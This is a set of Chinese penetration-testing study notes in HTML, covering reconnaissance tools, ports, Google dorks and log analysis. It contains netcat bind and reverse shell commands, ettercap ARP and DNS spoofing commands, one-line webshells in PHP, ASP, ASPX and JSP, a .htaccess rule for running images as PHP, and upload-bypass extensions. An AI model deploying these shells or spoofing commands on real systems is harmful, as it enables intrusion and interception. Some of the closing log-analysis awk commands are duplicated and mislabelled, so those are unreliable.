<link href="darkdown.css" rel="stylesheet"></link> 
<h1>常见术语</h1>
<ol>
<li>脚本(asp,php,jsp)</li>
<li>html(css,js,html)</li>
<li>HTTP协议</li>
<li>CMS(B/S)</li>
<li>MD5</li>
<li>肉鸡、抓鸡、跳板</li>
<li>一句话、小马、大马、webshell、提权、后门、跳板</li>
<li>源码打包、脱裤</li>
<li>嗅探、rookit</li>
</ol>
<h1>渗透测试流程</h1>
<ul>
<li>明确目标</li>
<li>信息收集</li>
<li>漏洞参测</li>
<li>漏洞验证</li>
<li>编写报告</li>
<li>信息整理</li>
<li>获取所需</li>
<li>信息分析</li>
</ul>
<h1>HTTP头</h1>
<p>在php中会通过使用<code>$_SERVER[&quot;HTTP_CLIENT_IP&quot;]</code>或者<code>$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]</code>来获取IP，因此，可以修改http头中的X-Forwarded-For<code>、</code>client-ip`来进行攻击。</p>
<p>可以实现突破服务器访问限制IP，可以进行http头注入攻击</p>
<p>HTTP头部信息解析：</p>
<pre><code class="language-http">200 响应码
date 日期
content-type 类型
Accept-Charset:  浏览器可以接受的字符集
Content-Length:  请求正文的长度
Cookie:          最重要的请求头信息之一
</code></pre>
<h1>常见端口</h1>
<table>
<thead>
<tr>
<th style="text-align:center">常见服务</th>
<th style="text-align:center">常用端口</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">HTTP</td>
<td style="text-align:center">80  8080  3128  8081  9080</td>
</tr>
<tr>
<td style="text-align:center">FTP</td>
<td style="text-align:center">21  2121</td>
</tr>
<tr>
<td style="text-align:center">telnet</td>
<td style="text-align:center">23  233  2323</td>
</tr>
<tr>
<td style="text-align:center">TFTP</td>
<td style="text-align:center">69/udp</td>
</tr>
<tr>
<td style="text-align:center">SSH  SCP</td>
<td style="text-align:center">22/tcp</td>
</tr>
<tr>
<td style="text-align:center">E-mail</td>
<td style="text-align:center">25/tcp（易受害）       110/tcp</td>
</tr>
<tr>
<td style="text-align:center">TOMCAT</td>
<td style="text-align:center">8080</td>
</tr>
<tr>
<td style="text-align:center">WIN2003-LogIN</td>
<td style="text-align:center">3389</td>
</tr>
<tr>
<td style="text-align:center">Oracle</td>
<td style="text-align:center">1521</td>
</tr>
<tr>
<td style="text-align:center">SQL</td>
<td style="text-align:center">1433/tcp  1433/udp</td>
</tr>
<tr>
<td style="text-align:center">QQ</td>
<td style="text-align:center">1080/udp</td>
</tr>
<tr>
<td style="text-align:center">MCBE</td>
<td style="text-align:center">19132  19134  19136</td>
</tr>
<tr>
<td style="text-align:center">MCJE</td>
<td style="text-align:center">16384  16386  16382</td>
</tr>
</tbody>
</table>
<h1>常用指令</h1>
<h2>Windows</h2>
<p><code>systeminfo</code>查看系统信息。</p>
<h2>Linux</h2>
<p><code>du [选项] [目录/文件]</code>查看文件/目录的存储空间占用情况。</p>
<p>​	选项： -a 包含文件和目录</p>
<p>​				-h  输出人话</p>
<p>​				-s  百分比</p>
<h1>各种网络以及特点</h1>
<h2>局域网</h2>
<ul>
<li>距离短</li>
<li>延迟小</li>
<li>传输速率高</li>
<li>传输可靠</li>
</ul>
<h2>广域网</h2>
<p>常用设备：Modem  路由器  广域网交换机  接入服务器</p>
<h2>TCP/IP协议栈</h2>
<h3>应用层</h3>
<p>HTTP  Telnet  FTP  TFTP</p>
<h3>传输层</h3>
<p>TCP/UDP</p>
<h3>网络层</h3>
<p>IP</p>
<h3>数据链路层</h3>
<p>Ethernet  802.3   PPP</p>
<h3>物理层</h3>
<p>接口和电缆</p>
<h1>工具与语法</h1>
<h2>信息收集</h2>
<ul>
<li>
<p>对应IP收集</p>
<ul>
<li>nslookup</li>
<li>ping</li>
<li>海外ping： tools.ipip.net/newping.php</li>
</ul>
</li>
<li>
<p>子域名收集</p>
<ul>
<li>layer</li>
<li>subDomainsBrute</li>
<li>github.com/shmily/OneForAll</li>
<li>dorks.faisalahmed.me</li>
</ul>
</li>
<li>
<p>whois</p>
<ul>
<li>爱站网</li>
<li>站长工具</li>
<li>微步在线</li>
<li>site.ip138.com</li>
<li>searchdns.netcraft.com</li>
<li>whois.chinaz.com</li>
<li>whois.cloud.tencent.com</li>
<li>ipwhoid.cnnic.net.cn/index.jsp</li>
</ul>
</li>
<li>
<p>VirusTotal</p>
<ul>
<li>www.virustotal.com/gui/home/upload</li>
</ul>
</li>
<li>
<p>指纹采集</p>
<ul>
<li>github.com/TideSec/TideFinger</li>
<li>finger.tidesec.net</li>
</ul>
</li>
<li>
<p>资产收集</p>
<ul>
<li>quake.360.net</li>
<li>fafa.info</li>
<li>hunter.qianxin.com</li>
</ul>
</li>
<li>
<p>搜素引擎</p>
<ul>
<li>邮箱收集： hunter.io</li>
<li>zoomeye.org</li>
<li>crt.sh</li>
<li>WIFI定位： wigle.net</li>
</ul>
</li>
</ul>
<h2>DNS收集</h2>
<pre><code class="language-shell">dnsdict6 [options] [domain] [字典]

-4 查询IPV4的地址
-D 显示自带的字典
-t 线程数，最高32，默认是8
-d 显示NS MX
-S SRV服务器名称猜解
</code></pre>
<pre><code class="language-shell">dig domain any
</code></pre>
<pre><code class="language-shell">host hostname
</code></pre>
<h2>服务器分析</h2>
<p>检测服务器是否有负载均衡</p>
<pre><code class="language-shell">lbd 域名
</code></pre>
<h2>netcat隧道指令传输</h2>
<pre><code class="language-shell">正向链接： 
受害者执行： nc -d -L -p 端口 -e shell.bin
入侵机执行： nc 受害者 端口

反向链接： 
攻击方执行: nc -l -p 端口
受害方执行： nc -d 攻击者 端口 -e shell.bin
</code></pre>
<h2>反向代理</h2>
<pre><code class="language-shell">ptunnel -p 本机地址 -lp 内部端口 -da 外部地址 -dp 外部端口 
</code></pre>
<h2>DNS欺骗</h2>
<pre><code class="language-shell">ettercap -i 网卡 -Tq -P dns_spoof /网关/受害者/

配置文件： /etc/ettercap/etter.dns
</code></pre>
<h2>arp欺骗</h2>
<pre><code class="language-shell">ettercap -i 网卡 -Tq -M arp:remote /网关/受害者ip/
</code></pre>
<h2>收集方向</h2>
<ul>
<li>收集方向
<ul>
<li>robots.txt
<ul>
<li>后台目录</li>
<li>安装包</li>
<li>上传目录</li>
<li>mysql管理接口</li>
<li>安装页面</li>
<li>phpinfo</li>
<li>编辑器</li>
<li>iis短文件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2>常用工具</h2>
<ul>
<li>常用工具
<ul>
<li>字典爆破
<ul>
<li>御剑</li>
<li>dirbuster</li>
<li>wwwscan</li>
<li>IIS_shortname_Scanner</li>
<li>hydra</li>
</ul>
</li>
<li>蜘蛛爬行
<ul>
<li>爬行菜刀</li>
<li>webrobot</li>
<li>burp</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2>端口扫描</h2>
<ul>
<li>nmap</li>
<li>portscan</li>
<li>ntscan</li>
<li>telnet</li>
</ul>
<h2>旁站C段</h2>
<p>旁站：同服务器其他站点</p>
<p>C段：同一网段其他服务器</p>
<p>常用工具</p>
<ul>
<li>web
<ul>
<li>8k旁站</li>
<li>御剑1.5</li>
</ul>
</li>
<li>端口
<ul>
<li>portscan</li>
</ul>
</li>
</ul>
<h2>整站分析</h2>
<ul>
<li>服务器类型
<ul>
<li>服务器平台、版本等</li>
</ul>
</li>
<li>网站容器
<ul>
<li>搭建网站的服务组件，例如：iis、Apache、nginx、</li>
</ul>
</li>
<li>脚本类型</li>
<li>数据库类型</li>
<li>CMS类型</li>
<li>WAF</li>
</ul>
<h2>谷歌hacker</h2>
<ul>
<li>intext:
<ul>
<li>查找网页中含有xx关键字的网站</li>
<li>intext: 管理员登录</li>
</ul>
</li>
<li>intitle:
<ul>
<li>查找某个标题</li>
<li>intitle: 后台登录</li>
</ul>
</li>
<li>Filetype:
<ul>
<li>查找某个类型的文件</li>
<li>数据挖掘 filetype: doc</li>
</ul>
</li>
<li>inurl
<ul>
<li>查找url中带有某字段的网站</li>
<li>inurl: php?id=</li>
</ul>
</li>
<li>Site:
<ul>
<li>在某域名中查找信息</li>
</ul>
</li>
</ul>
<h2>后台查找</h2>
<ol>
<li>弱口令默认后台
<ol>
<li>admin</li>
<li>admin/login.asp</li>
<li>manage</li>
<li>login.asp</li>
</ol>
</li>
<li>查看网页的链接
<ol>
<li>一般来说，网站的主页有管理员登录类似的东西，一般会被管理员删掉。</li>
</ol>
</li>
<li>查看网站图片的属性</li>
<li>查看网站使用的管理系统</li>
<li>一些工具</li>
<li>查看网站编辑器是否有默认后台</li>
<li>短文件利用</li>
<li>sqlmap --sql-shell load_file('index.php');</li>
</ol>
<h2>绕过CDN</h2>
<ul>
<li>使用超级ping来判断网站有没有使用CDN</li>
<li>查找二级域名</li>
<li>让服务器主动发包（邮件）</li>
<li>敏感文件泄漏</li>
<li>查询历史解析IP</li>
<li>访问绕过（修改hosts文件）</li>
</ul>
<h2>密码生成</h2>
<pre><code class="language-shell">cewl -w 字典 目标url
</code></pre>
<h2>破解zip</h2>
<pre><code class="language-shell">rarcrack --type rar --threads 10 test.rar
</code></pre>
<h2>一句话木马</h2>
<pre><code class="language-php">&lt;?php @eval($_GET['wuya']); ?&gt;
</code></pre>
<pre><code class="language-asp">&lt;%eval request(&quot;wuya&quot;)%&gt;
</code></pre>
<pre><code class="language-aspx">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval (Requst.Item['wuya'],&quot;unsafe&quot;);%&gt;
</code></pre>
<p>执行<code>system</code>函数即可调用<code>shell</code></p>
<pre><code class="language-jsp">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;
</code></pre>
<h2>等价扩展名</h2>
<table>
<thead>
<tr>
<th style="text-align:center">语言</th>
<th style="text-align:center">等价扩展名</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">asp</td>
<td style="text-align:center">asa,cer,cdx</td>
</tr>
<tr>
<td style="text-align:center">aspx</td>
<td style="text-align:center">ashx,asmx,ascx</td>
</tr>
<tr>
<td style="text-align:center">php</td>
<td style="text-align:center">php2,php3,php4,php5,phps,phtml</td>
</tr>
<tr>
<td style="text-align:center">jsp</td>
<td style="text-align:center">jspx,jspf</td>
</tr>
</tbody>
</table>
<h2>.htaccess</h2>
<p>主要作用：url重写，自定义错误界面，MIME类型配置以及访问权限控制等。</p>
<p>可以用来实现伪静态、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p>
<p>在渗透方面主要用于调用php去执行一个jpg文件</p>
<pre><code class="language-htaccess">&lt;FileMatch &quot;a.jpg&quot;&gt;
	SetHandler application/x-httpd-php
&lt;/FileMatch&gt;
</code></pre>
<h2>文件上传漏洞</h2>
<p>前提：</p>
<ol>
<li>网站上传功能可以正常使用   redis   mysql</li>
<li>文件类型允许上传  php  asp</li>
<li>文件路径可以确定</li>
<li>文件可以被访问，可以被执行或被包含</li>
</ol>
<h2>漏洞搜索</h2>
<pre><code class="language-shell">searchsploit 内核版本号
</code></pre>
<p>下载漏洞文件</p>
<pre><code class="language-shell">searchsploit -m 9542.c
</code></pre>
<h1>日志发现和伪装</h1>
<h2>Nginx</h2>
<h2>Apache</h2>
<h2>Windows</h2>
<h2>Linux</h2>
<h3>日志位置</h3>
<p><code>/var/log/dmesg</code>内核的一些信息</p>
<p><code>/var/log/auth.log</code>系统授权信息，用户登录所用的身份验证机制</p>
<p><code>/var/log/boot.log</code>系统启动时记录的信息</p>
<p><code>var/log/deamon.log</code>后台运行的系统守护进程记录</p>
<p><code>var/log/kern.log</code>内核记录的信息</p>
<p><code>var/log/lastlog</code>所有用户最近登陆信息，使用<code>lastlog</code>命令查看内容</p>
<p><code>var/log/maillog</code>和<code>var/log/mail.log</code>邮件服务器信息</p>
<p><code>var/log/user.log</code>用户级日志</p>
<p><code>var/log/xorg.x.log</code>来自x服务器的信息</p>
<p><code>var/log/btmp</code>记录登陆失败的信息，使用<code>lastf /var/log/btmp | more</code>命令查看内容</p>
<p><code>/var/log/yum.log</code>使用yum安装包时的记录，删除有依赖项的包时，可以引用此文件</p>
<p><code>/var/log/cron</code>有关cron的运行信息</p>
<p><code>/var/log/secure</code>包含身份验证和授权权限相关的信息（包括sshd等）</p>
<p><code>/var/log/wtmp-wtmp</code>记录所有登陆和注销</p>
<p><code>/var/log/wtmp-utmp</code>有关当前系统用户的信息</p>
<p><code>/var/log/faillog</code>失败的用户登录尝试</p>
<p><code>/var/log/httpd</code>和<code>/var/log/apache2</code>Apache服务器的日志</p>
<p><code>/var/log/conman/-conman</code>客户端的日志文件</p>
<p><code>/var/log/mail/</code>邮件服务器的其他日志</p>
<p><code>/var/log/audit/</code>Linux审核守护程序的日志</p>
<p><code>/var/log/settroubleshoot/</code>SELinux使用settroubleshooted来通知文件安全上下文中的问题，并将消息记录在此</p>
<p><code>/var/log/samba/</code>Samba存储的日志</p>
<p><code>/var/log/sa/</code>Sysstat包收集的每日sar文件</p>
<h3>示例</h3>
<p>登入失败次数：</p>
<pre><code class="language-shell">sudo grep &quot;Failed password&quot; auth.log | wc -l
</code></pre>
<p>登入成功次数：</p>
<pre><code class="language-shell">sudo grep &quot;password&quot; auth.log | grep -v Failed | grep -v Invalid
</code></pre>
<p>统计攻击着IP：</p>
<pre><code class="language-shell">sudo awk '{if($6==&quot;Failed&quot;&amp;&amp;$7==&quot;password&quot;){if($9==&quot;invalid&quot;){ips[$13]++;users[$11]++}else{user[$9]++;ips[$11]++}}}END{for(ip in ips){print ip,ips[ip]}}' auth.* | wc -l
</code></pre>
<p>攻击次数排列，由高到低：</p>
<pre><code class="language-shell">sudo awk '{if($6==&quot;Failed&quot;&amp;&amp;$7==&quot;password&quot;){if($9==&quot;invalid&quot;){ips[$13]++;users[$11]++}else{user[$9]++;ips[$11]++}}}END{for(ip in ips){print ip,ips[ip]}}' auth.* | wc -l
</code></pre>
